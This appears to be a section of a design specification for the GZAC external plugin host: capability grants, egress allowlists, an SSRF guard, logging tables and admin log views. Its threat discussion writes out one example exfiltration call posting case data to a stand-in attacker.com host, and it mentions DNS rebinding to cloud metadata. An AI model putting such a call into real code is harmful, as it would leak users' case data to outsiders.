implements the contract natively (no Extism) for one plugin — action (`greet`, `SERVICE_TASK_START`
+ service-token callback), config + action-config + case-tab iframe bundles (built with esbuild
against `@valtimo/plugin-sdk/frontend`), a `handle_request` `/data` route (levels 2–4), and a
RabbitMQ event consumer that notes back on `document.created`. HMAC verification reproduces
`ExternalPluginHmacSigner` byte-for-byte. It doubles as living documentation of the app contract.

**Verification.** `:backend:external-plugin:test` (incl. new `register`-persists-kind,
APP-upload-rejected, and default-kind cases) and `:backend:app:gzac:compileKotlin` BUILD SUCCESSFUL.
Demo app `npm run build` clean (server `tsc` + three iframe bundles); a live run confirmed `/health`,
the public `/plugin-manifest`, a correctly-signed `GET /api/host/plugins` (→ 200 with the single
plugin), and an unsigned / wrong-secret call (→ 401). Frontend `@valtimo/{plugin,plugin-management}`
type-check clean; `en`/`nl` bundles updated (`addApp`, `tabs.integrations`, `labels.kind`, `kind.*`).

## 18. Host capabilities — `gzac_api`, `http_request`, `kv`, `log`, `frontend_data` ✅

A capability is a host-side ability a plugin may be granted: the four host functions (`gzac_api`,
`http_request`, `kv`, `log`) plus `frontend_data`, which gates the host's plugin-data route
(§13.5, reachable only with an introspected, configuration-bound user token) rather than a host
function. Every capability requires an explicit grant:
the plugin declares what it needs in `manifest.permissions.capabilities`, the admin accepts each
one during configuration (§4), and the host enforces the allowlist at call time. A plugin that
calls a capability it was not granted receives a structured error — never silent access, never
a crash.

### 18.1 Manifest declaration

```json
{
  "permissions": {
    "capabilities": ["gzac_api", "http_request", "kv", "log"],
    "endpoints": [
      { "method": "GET", "pattern": "/api/v1/document/*" }
    ]
  }
}
```

`permissions.capabilities` is a string array. Known capability names (`HOST_CAPABILITIES` in the
SDK): `gzac_api`, `http_request`, `kv`, `log`, `frontend_data`. Unknown names are rejected at
upload (manifest validation, §9). `endpoints` remains
relevant only when `gzac_api` is declared — it scopes *which* GZAC REST endpoints the service/user
token may reach. A plugin that does not declare `gzac_api` has no use for `endpoints`.

**SDK type** (`PluginManifest`): `permissions?: { endpoints?: Endpoint[]; capabilities?: string[] }`,
with the `HOST_CAPABILITIES` const and `HostCapability` union alongside. Manifest validation
(`validatePluginManifest`) rejects unknown capability names and requires the array when any
capability-dependent feature is declared (e.g. `endpoints` without `gzac_api` is a validation
error).

### 18.2 GZAC-side storage and activation gate

**Table** `external_plugin_granted_capability` (DDL in the release changelog,
`13-32-0/20260716-external-plugin-granted-capability.xml`):

| Column | Type | Notes |
|--------|------|-------|
| `id` | `uuid` | PK |
| `configuration_id` | `uuid NOT NULL` | FK → `external_plugin_configuration` |
| `capability` | `varchar(64) NOT NULL` | e.g. `gzac_api`, `http_request`, `kv`, `log` |
| `granted_at` | `timestamptz NOT NULL` | |

`UNIQUE(configuration_id, capability)`.

`ExternalPluginConfigurationService.create()` receives `grantedCapabilities: List<String>`, parses
each name into the `ExternalPluginCapability` enum **before anything is persisted** (an unknown
name is rejected up front), and runs `validateGrantedCapabilitiesCoverManifest()` — the same
exact-match gate as endpoints and events (§3.1): every capability declared in the manifest must be
granted, and nothing undeclared may be.
The granted capabilities are persisted and pushed to the host alongside the configuration (§18.3).
`update()` does not accept `grantedCapabilities` — capability grants cannot change through the
edit flow (same semantics as event grants); only the admin-confirmed version overwrite resets
them to the newly reviewed declared set (§11).

**Kotlin domain** `ExternalPluginGrantedCapability` (entity),
`ExternalPluginGrantedCapabilityRepository` (Spring Data JPA), `ExternalPluginCapability` (enum
whose `value` is the lowercase wire/manifest form, persisted via an `AttributeConverter` so the
database column holds the same identifier the manifest and the host protocol use).

### 18.3 Config push — capabilities to the host

The GZAC config-push body carries a `grantedCapabilities` array:

```json
{
  "pluginId": "case-summary",
  "pluginVersion": "0.1.0",
  "properties": { },
  "serviceToken": "eyJ…",
  "gzacBaseUrl": "http://gzac:8080",
  "grantedCapabilities": ["gzac_api", "http_request", "kv", "log"],
  "eventSubscriptions": ["com.ritense.valtimo.document.created"],
  "eventBroker": { }
}
```

The host's `ConfigRepository` stores `granted_capabilities JSONB NOT NULL DEFAULT '[]'` on
`plugin_configurations` (migration version 3). `ConfigRegistry` passes it through, and
every host function checks it before executing.

### 18.4 Host-side enforcement

Each host function checks the calling configuration's granted capabilities at the start of every
invocation. The `hostContext` (already carries `configurationId`) is used to look up the
configuration's `grantedCapabilities` from the `ConfigRegistry`. If the required capability is
absent, the host function returns a capability-denied error response without performing any work.

```
gzac_api    → requires "gzac_api" in grantedCapabilities
http_request → requires "http_request" in grantedCapabilities
kv          → requires "kv" in grantedCapabilities
log         → requires "log" in grantedCapabilities
```

The check is implemented as one shared entry guard, `guardHostCall(callContext, addr, name)`
(`host-functions/guard.ts`), used by all four host functions: it resolves the per-call host
context, enforces the capability gate, and parses the plugin's JSON request; each host function
maps a failed guard onto its own reply envelope. On denial the Wasm call receives a structured
JSON error carrying `"Capability 'X' not granted for this configuration"` (403-shaped) —
deterministic, never ambiguous. The grants are resolved per call from the config registry
(`PluginManager.resolveGrants`, through the registry's short-TTL cache — §7), so a re-push takes
effect immediately.

There is **no implicit grant**: a configuration pushed without a `grantedCapabilities` list stores
an empty allowlist, and every gated host function denies it. (The only lenient default is the
*endpoint* list on `gzac_api`, where an absent list means "no host-side allowlist check, warn and
rely on GZAC's server-side filter" — §8.2.)

### 18.5 Capability: `gzac_api` ✅

The host function of §3.5 (`host-functions/gzac-api.ts`): the shared guard checks
`grantedCapabilities` before anything runs, the configuration's granted-endpoint allowlist is
enforced host-side before the upstream fetch, plugin-supplied `Authorization` headers are
stripped with the host credential attached last, and the fetch is timeout-bounded — see §3.5 for
the full mechanics. Service/user token selection (§13.4) and the GZAC-side allowlist filter (§3.4)
complete the chain.

SDK: `gzacApi.get()`, `gzacApi.post()`, etc., plus `gzacApi.asUser.*`.

### 18.6 Capability: `http_request` ✅

Allows the plugin to make HTTP requests to external (non-GZAC) services. The host performs the
fetch and returns the response; the plugin never gets raw network access.

**Host function** `http_request` (`host-functions/http-request.ts`):

```typescript
interface HttpRequestInput {
  method: string;     // GET, POST, PUT, DELETE, PATCH
  url: string;        // Full URL — must not target gzacBaseUrl (enforced)
  body?: unknown;
  headers?: Record<string, string>;
  timeoutMs?: number; // default 30_000, max 60_000
}

interface HttpRequestOutput {
  status: number;
  headers: Record<string, string>;
  body: unknown;      // parsed as JSON when possible, otherwise raw text
}
```

**Security constraints:**
- **Deny by default** — a destination is refused unless it is in the configuration's egress
  allowlist (`security/egress-allowlist.ts`). This brings the Wasm half of a plugin in line with the
  `connect-src 'self'` its iframe half already runs under (§7): without it, an author who cannot
  beacon out from the browser could `httpRequest.post("https://attacker.com", caseData)` from the
  backend for the same effect. The realistic threat is not a deliberately hostile author but a
  **compromised npm dependency inside a plugin the customer legitimately trusts** — injected code
  phones home to a domain the manifest never declared, which is exactly what a declared-egress
  allowlist catches. Because the check runs **before any name resolution**, it also closes
  DNS-encoded exfiltration: an undeclared hostname is never even looked up. What it does *not*
  close is the author's own declared domain — for a plugin integrating with a vendor's SaaS that
  endpoint is simultaneously the legitimate destination and a perfect exfil channel. No technical
  control fixes that; it is a trust decision the customer makes when installing the plugin, and it
  degrades gracefully: the destination is named on the acceptance screen, it is a party the customer
  has a commercial relationship with, and with a small fixed destination set the `plugin_logs`
  record below becomes **auditable** — an unexpected host in it is a finding.
- **Two declaration sources, unioned** — GZAC merges them and pushes one `allowedEgress` array, so
  the host never learns which source an entry came from:
  - `manifest.permissions.egress` — fixed origins the plugin author knows at build time
    (`api.kvk.nl`). A real grant: stored in `external_plugin_granted_egress`, all-or-nothing
    against the manifest, shown on the acceptance screen, and **immutable after activation** (like
    events and capabilities — resettable only via the admin-confirmed version overwrite, §11). A
    plugin silently gaining a destination on a configuration edit is precisely what this prevents.
  - `x-egress-target` configuration properties — environment-specific origins only the admin knows
    (`https://smartdocuments.acme-acc.internal:8443`). No grant table and no acceptance gate of its
    own, because the admin *typing the value* is the grant. Derived inside `pushToHost` from the
    already-decrypted properties, which is what keeps the allowlist tracking values that
    legitimately change on edit. See §18.6.1.
- **Matched on origin, not hostname** — scheme + host + port. A scheme-less manifest entry
  (`api.kvk.nl`) means https on 443; hostname-only matching would let an `http://` downgrade through
  the moment someone sets `HOST_ALLOW_HTTP=true`. A missing port means *the default port*, never
  "any port", or `sd.internal` would silently authorise `sd.internal:9200`. Wildcards are
  manifest-only, `*.` prefix only, at least two labels after it (so `*.com` is impossible), match
  exactly one label, and are rendered distinctly on the acceptance screen — `*.vendor.com` under
  author-controlled DNS reopens both arbitrary-subdomain exfiltration and the DNS channel.
- **HTTPS-only by default** — plain-http targets require `HOST_ALLOW_HTTP=true` (local dev).
- **SSRF guard**: connections to private/reserved addresses are blocked at the socket's own DNS
  lookup (a guarded undici `Agent`, `security/url-guard.ts`), so the address check is pinned to
  the exact addresses being connected to — no DNS-rebinding window — and automatically covers
  every redirect hop; IP-literal hosts (which skip DNS) are rejected up front. This is a **safety
  floor beneath the allowlist, not a permission mechanism**: the two layers are complementary, not
  alternatives. An origin allowlist alone re-opens DNS rebinding (a declared `sd.internal` that
  resolves to 169.254.169.254), and the address envelope alone is host-global and says nothing about
  which plugin is calling. Neither is sound on its own.
- **Operator carve-out, never a bypass** — `HOST_ALLOWED_INTERNAL_CIDRS` (e.g.
  `10.4.7.12/32,10.4.7.0/24`) declares ranges this host may reach despite being private. Applied
  *inside* `isPrivateOrReservedAddress`, so both enforcement points (the IP-literal check and the
  guarded agent's `lookup`) inherit it and the rebinding-proof property survives. **169.254.0.0/16
  is a hard floor** and is never allowlistable — including its IPv4-mapped forms — because cloud
  metadata services hand instance credentials to anything that can reach them and no plugin has a
  legitimate reason to call one; an overlapping entry is refused at startup with a loud error, and
  the floor is re-checked at runtime. Malformed entries are dropped with a warning, which fails
  closed. `HOST_ALLOW_PRIVATE_NETWORK=true` remains the **dev-only** switch — it replaces the
  guarded dispatcher with a bare one, disabling the classifier wholesale, and now logs a loud
  warning at startup when it is on.
  > **Keep these ranges narrow, and prefer a NetworkPolicy.** In Kubernetes the right place for
  > egress policy is a NetworkPolicy or an egress proxy, not an app-level CIDR list. If the answer
  > to "which CIDR do we allowlist?" is the pod CIDR (`10.42.0.0/16` or similar), the allowlist has
  > become a no-op: that reaches every pod in the cluster, including GZAC directly by IP — which
  > also sidesteps the `gzacBaseUrl` origin check, since that compares origin strings and a pod IP
  > or alternate Service DNS name will not match. Use a specific ClusterIP or a /32.
- The `url` must not resolve to the configuration's `gzacBaseUrl` origin — use `gzac_api` for
  that.
- **Redirects are followed manually** (max 5) so every hop re-runs the full target validation —
  with `redirect: "follow"` a public URL could bounce the request to an internal one or to GZAC
  unchecked. Credential headers (`Authorization`, `Cookie`, `Proxy-Authorization`) are stripped
  when a redirect crosses origins, and 303 (plus 301/302 for body-bearing methods) becomes a GET
  without body per fetch semantics.
- Timeout defaults to 30 s and is capped at 60 s to prevent resource exhaustion.

**Logging:** Every `http_request` call is logged to the plugin host's `plugin_logs` table (§18.9,
`source: "http_request"`) with method, **redacted URL** (userinfo and query string stripped —
`user:pass@` and `?token=…` routinely carry secrets, so only scheme+host+path are recorded),
status, duration, and the calling configuration/plugin id. This gives the admin visibility into
what external calls plugins make — and with a declared destination set it is *auditable* rather than
merely voluminous: a host in the log that is not on the allowlist is a finding, not noise.

**SDK** (`plugin-sdk/src/http-request.ts`):

```typescript
export const httpRequest = {
  get<T = unknown>(url: string, headers?: Record<string, string>): HttpRequestResponse<T>;
  post<T = unknown>(url: string, body?: unknown, headers?: Record<string, string>): HttpRequestResponse<T>;
  put<T = unknown>(url: string, body?: unknown, headers?: Record<string, string>): HttpRequestResponse<T>;
  delete<T = unknown>(url: string, headers?: Record<string, string>): HttpRequestResponse<T>;
};
```

Mirrors the `gzacApi` shape. Calls the `http_request` Extism host function under the hood, same
`Host.getFunctions()` mechanism.

#### 18.6.1 Declaring egress targets

Both declaration sources live in `manifest.json`, and which one a target belongs in follows from who
knows its value. A target that is the same in every environment is **plugin-intrinsic** — the author
knows it at build time, so it belongs in `permissions.egress`. A target that differs per customer or
per environment is **deployment-intrinsic**: a manifest declaration would be forced into one of two
useless shapes, a wildcard broad enough to be meaningless or a per-environment rebuild of the
package. Those are already a configuration property the admin fills in, so that is where the grant
is drawn from — marked with `x-egress-target`, which follows the `x-secret` precedent (§18.4): a
JSON-Schema keyword the author puts on a property that GZAC walks server-side to decide behaviour.

```json
{
  "permissions": {
    "capabilities": ["http_request"],
    "egress": ["api.kvk.nl"]
  },
  "configurationSchema": {
    "properties": {
      "smartDocumentsUrl": { "type": "string", "format": "uri", "x-egress-target": true },
      "apiKey": { "type": "string", "x-secret": true }
    }
  }
}
```

Three parties, each declaring only what they actually know:

| Party | Declares | Where |
|---|---|---|
| Plugin author | *"I call these fixed services, plus one configurable one"* | `permissions.egress` + `x-egress-target` |
| Admin | *"in this environment the configurable one is `https://sd.acme-acc.internal:8443`"* | the configuration value, as today |
| Operator | *"this host may reach `10.4.7.0/24` at all"* | `HOST_ALLOWED_INTERNAL_CIDRS` env |

The effective policy is the **union of both declaration sources**, intersected with the CIDR envelope
for anything resolving into private space, with 169.254/16 excluded unconditionally:

```
allowed = inDeclaredOrigins(url)
          && (blocked(resolvedAddr) ? inOperatorCidrs(resolvedAddr) : true)
          && !isMetadataAddress(resolvedAddr)          // hard floor, never overridable
```

Validation rules, enforced at every layer that can catch them early:

- **Pack tool and upload route** (`plugin-sdk/manifest-validation.ts`, shared so the rules are
  defined once): every `permissions.egress` entry must normalise to an http(s) origin — no
  credentials, no path, no bare or whole-TLD wildcard — and declaring `egress` requires
  `http_request` in `capabilities`, the same shape as the existing endpoints→`gzac_api` rule. A
  property marked `x-egress-target` must be a string with `"format": "uri"`, since GZAC has to parse
  its value into an origin and a property that never holds a URL would look like a grant while
  contributing nothing.
- **Activation/edit** (`ExternalPluginConfigurationService`): granted egress must match the manifest
  exactly, and a marked property whose value is not a parseable absolute http(s) URL **rejects the
  configuration** with a message naming the field. Fail closed: silently contributing nothing would
  leave the admin believing they had granted a destination the host will refuse.
- **Discovery** (`ExternalPluginDiscoveryService`): a new plugin version that drops the
  `x-egress-target` flag from a property logs a loud warning, mirroring `warnOnDroppedSecretFlags` —
  the destination silently disappears from the allowlist otherwise, and the plugin's calls start
  failing.

Normalisation is mirrored in three places — the SDK module `@valtimo/plugin-sdk/egress` (shared by the
manifest validator and the host's runtime check), `PluginEgressTargets` in GZAC, and the frontend's
display-only preview — so a target that passes review is exactly the target permitted at runtime.

If a URL property is also marked `x-secret` (credentials in userinfo), derivation still works because
GZAC holds the plaintext server-side at push time; the origin is redacted in the UI and logs, and an
entry carrying credentials is rejected rather than normalised.

**Migration.** This is a breaking change to the grant model: existing configurations get an empty
allowlist and therefore make no outbound calls until GZAC pushes one. In-tree the blast radius is a
single manifest line for the `case-summary` sample (which hardcodes
`https://jsonplaceholder.typicode.com/todos/1`); internal POC plugins need auditing for undeclared
destinations. The window for landing this cheaply closes at V1.

### 18.7 Capability: `kv` ✅

A per-configuration key-value store persisted in the plugin host's PostgreSQL. Plugins use it to
store state across invocations — counters, cached computations, user preferences, etc.

**Host function** `kv` (`host-functions/kv.ts`):

```typescript
interface KvInput {
  op: "get" | "set" | "delete" | "list";
  key?: string;       // required for get/set/delete; max 256 chars
  value?: unknown;     // required for set; stored as JSONB
  prefix?: string;     // for list — returns keys matching this prefix
}

interface KvOutput {
  status: number;      // 200 on success, 404 on missing key
  value?: unknown;     // for get
  keys?: string[];     // for list
}
```

**Storage** (`plugin_kv` table in the host's PostgreSQL, §18.9):

| Column | Type | Notes |
|--------|------|-------|
| `configuration_id` | `text NOT NULL` | scoped to the configuration |
| `key` | `text NOT NULL` | max 256 chars, validated host-side |
| `value` | `jsonb NOT NULL` | |
| `created_at` | `timestamptz` | |
| `updated_at` | `timestamptz` | |

PK: `(configuration_id, key)`, plus a `text_pattern_ops` index backing prefix `list`. KV rows have
no automatic retention or delete cascade — they persist until the plugin deletes them
(`KvRepository.deleteAll(configId)` exists for manual cleanup).

**SDK** (`plugin-sdk/src/kv.ts`):

```typescript
export const kv = {
  get<T = unknown>(key: string): T | undefined;
  set(key: string, value: unknown): void;
  delete(key: string): boolean;
  list(prefix?: string): string[];
};
```

Synchronous from the plugin's perspective (Extism suspends the call).

### 18.8 Capability: `log` ✅

Structured logging persisted in the plugin host's PostgreSQL: a host function that both logs to
the host's pino logger *and* persists to the `plugin_logs` table for admin visibility.

**Host function** `log` (`host-functions/log.ts`):

```typescript
interface LogInput {
  level: "info" | "warn" | "error" | "debug";
  message: string;          // truncated to 4 KB
  data?: Record<string, unknown>;  // structured context
}
```

No output — fire-and-forget from the plugin's perspective. The host function:
1. Writes to the pino logger at the requested level (an unknown level coerces to `info`), with the
   structured `data` attached.
2. Inserts a row into `plugin_logs` (§18.9, `source: "plugin"`) — async insert, does not block the
   Wasm call. Failures are logged to pino but do not bubble to the plugin.

**SDK** (`plugin-sdk/src/host-functions.ts`):

```typescript
export const log = {
  info(message: string, data?: Record<string, unknown>): void;
  warn(message: string, data?: Record<string, unknown>): void;
  error(message: string, data?: Record<string, unknown>): void;
  debug(message: string, data?: Record<string, unknown>): void;
};
```

The `data` parameter is optional. Outside Wasm (build/test), falls back to `console.*`.

### 18.9 Host persistent storage (plugin host PostgreSQL)

Migrations 3–5 in `plugin-host/app/src/db/index.ts`:

**Migration 3: `granted_capabilities` column on `plugin_configurations`**

```sql
ALTER TABLE plugin_configurations
  ADD COLUMN IF NOT EXISTS granted_capabilities JSONB NOT NULL DEFAULT '[]';
```

**Migration 4: `plugin_kv` + `plugin_logs`**

```sql
CREATE TABLE IF NOT EXISTS plugin_kv (
  configuration_id TEXT NOT NULL,
  key TEXT NOT NULL,
  value JSONB NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  PRIMARY KEY (configuration_id, key)
);
CREATE INDEX IF NOT EXISTS idx_plugin_kv_prefix ON plugin_kv (configuration_id, key text_pattern_ops);

CREATE TABLE IF NOT EXISTS plugin_logs (
  id BIGSERIAL PRIMARY KEY,
  configuration_id TEXT NOT NULL,
  plugin_id TEXT NOT NULL,
  plugin_version TEXT NOT NULL,
  level VARCHAR(8) NOT NULL,
  message TEXT NOT NULL,
  data JSONB,
  source VARCHAR(32) NOT NULL,   -- 'plugin' (SDK log calls) or 'http_request' (API-call log)
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_plugin_logs_config ON plugin_logs (configuration_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_plugin_logs_level ON plugin_logs (configuration_id, level, created_at DESC);
```

One log table serves both purposes, discriminated by `source`: SDK `log.*` calls insert with
`source: "plugin"`, and every `http_request` invocation auto-inserts its call record (redacted
URL, status, duration — §18.6) with `source: "http_request"`.

**Migration 5: `granted_endpoints` column on `plugin_configurations`**

```sql
-- NULL (default) means "not pushed" — a push without a granted-endpoint list makes the host skip
-- its side of the gzac_api allowlist check (GZAC still enforces it server-side). A pushed empty
-- list ('[]') denies every endpoint.
ALTER TABLE plugin_configurations
  ADD COLUMN IF NOT EXISTS granted_endpoints JSONB;
```

**Repositories:**
- `KvRepository` (`db/kv-repository.ts`) — `get`, `set`, `delete`, `list`, `deleteAll(configId)`.
- `LogRepository` (`db/log-repository.ts`) — `insert`, `query(configId, { page, size, level?,
  source? })`, `deleteOlderThan(retentionDays)`, `deleteByConfiguration(configId)`.

**Retention.** A scheduled cleanup job runs on host startup and every 6 h, deleting log rows older
than a configurable retention period (`LOG_RETENTION_DAYS` env, default 30). KV entries have no
automatic retention — they persist until explicitly deleted by the plugin. Removing a
configuration does not cascade to its KV/log rows: log rows age out through the retention job, and
the repositories expose `deleteAll`/`deleteByConfiguration` for manual cleanup.

### 18.10 Host route — log query endpoint

One HMAC-signed route on the plugin host (`routes/plugin-logs.ts`) for the GZAC admin UI to query
logs:

**`GET /api/host/configurations/:configId/logs`** — paginated structured logs.

Query params: `page` (0-based), `size` (default 25, max 100), `level` (optional filter), `source`
(optional filter — `plugin` or `http_request`, so API-call records are a filter of the same
route). `page`/`size` are defensively coerced: `parseInt` on garbage yields `NaN`, which would
flow into the SQL `LIMIT`/`OFFSET`, so a non-numeric value falls back to the default and the
result is clamped; the response echoes the coerced values. Returns:

```json
{
  "content": [
    {
      "id": 42,
      "level": "info",
      "message": "[case-summary] event com.ritense.valtimo.document.created",
      "data": { "resultId": "abc-123" },
      "source": "plugin",
      "createdAt": "2026-07-16T10:30:00Z"
    }
  ],
  "page": 0,
  "size": 25,
  "totalElements": 142
}
```

The route is HMAC-signed (§3.9) — the GZAC backend proxies the request via
`ExternalPluginHostClient.getConfigurationLogs`.

### 18.11 GZAC backend — log proxy endpoint

One management endpoint on the GZAC backend proxies the host's log route:

- `GET /api/management/v1/external-plugin/configuration/{configId}/logs`

ADMIN-gated in `ExternalPluginHttpSecurityConfigurer`, with an `@EndpointDescription(en, nl)`
annotation (§4). The resource looks up the configuration's host, signs the request with HMAC, and
forwards `page`/`size`/`level`/`source`. The client deliberately signs the bare path **without**
the query string — the host strips the query before verifying (§3.9), so the canonical strings
match; query parameters are not signature-bound by design.

### 18.12 Frontend — admin log view modal

A **"Logs"** option in the overflow menu (`ActionItem`) for external plugin configurations on
the plugin management page (`plugin-management.component.ts`), enabled only for external rows,
opens `PluginLogModalComponent` (`plugin-management/components/plugin-log-modal/`) — a standalone
`cds-modal` (size `lg`) containing one paginated `valtimo-carbon-list` over the proxied
`plugin_logs` rows, with **level** and **source** filter dropdowns (mapping to the route's query
params, so plugin logs and `http_request` API-call records live in the same list, filterable by
`source`). Columns: timestamp, level (tag, color-coded per level), source (tag), message; a row
click opens a detail aside showing the structured `data` JSON. Default page size 25.

**Service** (`ExternalPluginService`):
- `getConfigurationLogs(configId, params): Observable<PluginLogPage>` (models `PluginLogEntry`,
  `PluginLogPage`).

**i18n** — keys under `pluginManagement.logs.*` in `en.json` and `nl.json` (menu item, title,
column headers, level/source labels, empty state, close).

### 18.13 Demo plugin scenarios — `case-summary` ✅

The sample plugin (`plugin-host/sample-plugins/case-summary/`) ships scenarios that exercise
`http_request`, `kv`, and `log` alongside its `gzac_api` usage, proving each capability
produces results visible in GZAC.

**Manifest permissions:**

```json
{
  "permissions": {
    "capabilities": ["gzac_api", "http_request", "kv", "log", "frontend_data"],
    "endpoints": [
      { "method": "GET", "pattern": "/api/v1/document/*" },
      { "method": "POST", "pattern": "/api/v1/document/*/note" },
      { "method": "POST", "pattern": "/api/v1/case/*/search" },
      { "method": "POST", "pattern": "/api/v1/task/*/complete" }
    ]
  }
}
```

**`plugin.ts` scenarios:**

1. **`http_request` — fetch from a trusted test API.** A `request("/external-data", …)`
   handler calls `httpRequest.get("https://jsonplaceholder.typicode.com/todos/1")` — a public,
   stable, no-auth JSON API. The response (a todo item with `id`, `title`, `completed`) is
   returned to the case-tab iframe, which renders it in an "External API data" card alongside
   the other cards. This proves `http_request` works end-to-end: the plugin makes an outbound
   HTTP call, the result travels through the host back to the iframe, and is visible in the GZAC
   case tab.

2. **`kv` — persistent view counter.** The `request("/summary", …)` handler
   on each invocation reads `kv.get("view-count")`, increments, and writes
   `kv.set("view-count", count + 1)`. The count is returned in the response body and displayed in
   the case-tab iframe as "Tab views: N". This proves `kv` persists across invocations — refresh
   the tab and the counter increments. The counter is per-configuration, so two configurations of
   the same plugin have independent counts.

3. **`log` — structured logging visible in admin.** The `log.info(...)` calls
   carry a `data` parameter with structured context (e.g.
   `log.info("[case-summary] summary built", { documentId, summary, currency })`). The
   `request("/summary")` handler additionally logs at `debug` level with timing information, and
   the `countCases` handler emits a `log.warn(...)` when the upstream status is not
   200. These log entries appear in the admin log modal (§18.12), proving the structured logging
   pipeline works end-to-end.

**Case-tab frontend** (`frontend/case-tab.tsx`):

- **"External API data"** — calls `sdk.getPluginData("/external-data")` and renders the todo
  item's title and completion status. Shows loading/error states matching the existing cards.
- **"Tab views"** — the view count from the `/summary` response is displayed as a small badge or
  counter in the "Plugin-served data" card header.

**Translations** (`manifest.json`):

```json
{
  "en": {
    "caseTab.external.title": "External API data",
    "caseTab.external.todoTitle": "Todo",
    "caseTab.external.todoCompleted": "Completed",
    "caseTab.external.error": "Could not load external data.",
    "caseTab.viewCount": "Tab views"
  },
  "nl": {
    "caseTab.external.title": "Externe API-gegevens",
    "caseTab.external.todoTitle": "Todo",
    "caseTab.external.todoCompleted": "Voltooid",
    "caseTab.external.error": "Kon externe gegevens niet laden.",
    "caseTab.viewCount": "Tabbladweergaven"
  }
}
```

### 18.14 Permission UX — capabilities section ✅

The `PluginExternalPermissionsComponent` shows a capabilities section above the other two:

- **Host capabilities** — a `cds-structured-list` listing each declared capability with a
  localised name and description. The names and descriptions are static (not fetched from the
  backend like endpoint descriptions) — they are defined in the frontend translation bundle:

  | Capability | EN name | EN description |
  |-----------|---------|----------------|
  | `gzac_api` | GZAC API | Make authenticated calls to the GZAC REST API on behalf of the plugin or the logged-in user |
  | `http_request` | HTTP requests | Make outbound HTTP requests to external services |
  | `kv` | Key-value store | Read and write persistent key-value data scoped to this configuration |
  | `log` | Structured logging | Write structured log entries visible to administrators |

  Each row shows a tag with the capability name and the localised description.

- The existing single acknowledgement checkbox covers all three sections (capabilities, endpoints,
  events). The checkbox is required when **any** of the three sections has entries.

- In read-only mode (edit), all three sections are shown with the `acceptedNote` info notification.

**Create payload.** The `POST .../configuration` body carries `grantedCapabilities: string[]`.
The frontend maps `manifest.permissions.capabilities` to the payload. The backend validates the
exact match against the manifest declaration (§18.2).

### 18.15 Verification plan

- Host `tsc` build clean with four host functions and the new DB repositories.
- Backend `:backend:external-plugin:test` — new test cases:
  - `ExternalPluginConfigurationServiceTest`: `create()` rejects when `grantedCapabilities` does
    not cover `manifest.permissions.capabilities`; `create()` persists granted capabilities;
    `update()` does not accept `grantedCapabilities`.
  - `ExternalPluginHostClientTest`: `pushConfiguration` body includes `grantedCapabilities`.
- Sample plugin `build:pack` clean — manifest includes `permissions.capabilities`.
- Frontend `@valtimo/plugin-management` `ng build` clean — permissions component renders the
  capabilities section; log modal compiles.
- End-to-end browser verification:
  - Configure the sample plugin with all declared capabilities accepted.
  - Case tab renders: "External API data" card with todo from jsonplaceholder, view count
    incrementing on refresh, case counts (existing), and plugin-served data (existing).
  - Admin log modal shows structured log entries and API call logs for the configuration.
  - Reconfigure without `http_request` → the `/external-data` handler returns a capability-denied
    error, the card shows the error state.

## 19. Building-block process links ✅

External plugin actions are usable inside building-block processes with the same abstraction the
embedded plugin system uses: a link is either a **`FIXED`** reference (a concrete configuration
UUID) or a **`BUILDING_BLOCK`** reference (an abstract `pluginId@version`, resolved to a concrete
configuration per usage context at runtime).

**Reference model.** Both external link types embed the same `PluginConfigurationReference`
embeddable the embedded `PluginProcessLink` maps — shared `process_link` columns `reference_type`,
`plugin_definition_key` (= `pluginId`), and `plugin_definition_version` (external-only; embedded
rows keep it null because embedded definitions are unversioned). Two STI siblings mapping the same
embeddable columns is verified safe by `PluginConfigurationReferenceStiSpikeTest`
(`:backend:plugin`). The reference is **design-time metadata**: it drives validation, UI warnings,
and the import chooser (§20), while the runtime invocation always derives `pluginId` **and**
version from the resolved configuration's definition — a v1 action key can never be invoked
against a v2 configuration's token. Invariants (`ExternalPluginProcessLinkMapper`): `FIXED` ⇒
config id required (null only for a dangling import, §20), key/version derived from the
configuration at save time; `BUILDING_BLOCK` ⇒ config id null, key + version required from the
DTO.

**Runtime resolution (`ExternalPluginServiceTaskStartListener`).** A `BUILDING_BLOCK` reference is
resolved through the same optional `BuildingBlockPluginConfigurationResolver` SPI
(`backend/plugin`) the embedded `PluginService` uses — the building-block module's resolver walks
execution → `BuildingBlockInstance` → root instance → the call-activity's or case-definition
link's `pluginConfigurationMappings`. External entries share that one `Map<String, UUID>` under
the namespaced key **`external-plugin:<pluginId>@<version>`**, so embedded and external mappings
coexist without collision and version pinning stays strict (a block referencing two versions of
one plugin simply has two mapping rows). The listener validates the resolved configuration:
exists, definition `pluginId` matches the reference key, and the definition manifest still
declares the action key; a version mismatch proceeds on the resolved configuration's version with
a warning.

**Required-plugins surface.** `BuildingBlockPluginDefinitionService` /
`GET /api/management/v1/building-block/{key}/version/{versionTag}/plugin` also collect the
external `BUILDING_BLOCK` references from the block's process links (recursively through nested
blocks), returned with a `source: embedded|external` discriminator plus pluginId/version.

**Admin UX** (`@valtimo/process-link`). In building-block context the plugin picker
(`select-plugin-configuration`) lists external plugin **definitions** alongside embedded ones
(labels via `getExternalPluginDisplayName`, `Name (X.Y.Z)`); saving an external action in that
context writes a `BUILDING_BLOCK` reference (no configuration id). The call-activity /
case-definition mapping step (`configure-building-block-plugins`) renders a row per external
requirement with a dropdown of activated configurations — exact `pluginId@version` matches by
default, other versions of the same plugin selectable behind a non-blocking warning (the §11
compatibility-warning pattern) — and writes the namespaced key. Delete guards are unaffected:
`ExternalPluginHostUsageResolver` ignores links with a null configuration id, mirroring the
embedded rule that only fixed references block deletion.

## 20. Case-definition import/export parity ✅

Importing a case definition treats external plugin configurations exactly like embedded ones: the
import wizard shows every referenced configuration, the admin maps each to an existing
configuration in the target environment, unmapped references import as dangling and are repaired
later.

- **Export metadata.** `ExternalPluginProcessLinkExportResponseDto` /
  `ExternalPluginTaskFormProcessLinkExportResponseDto` carry `referenceType`,
  `pluginDefinitionKey`, and the version alongside the configuration id, so the target environment
  can list candidate configurations by `pluginId`.
- **Remap hook.** `ProcessLinkImporter` delegates configuration remapping per link type: each
  `ProcessLinkMapper` implements `applyPluginConfigurationMappings(node, mappings)` (the embedded
  mapper rewrites `pluginConfigurationId`; both external mappers rewrite
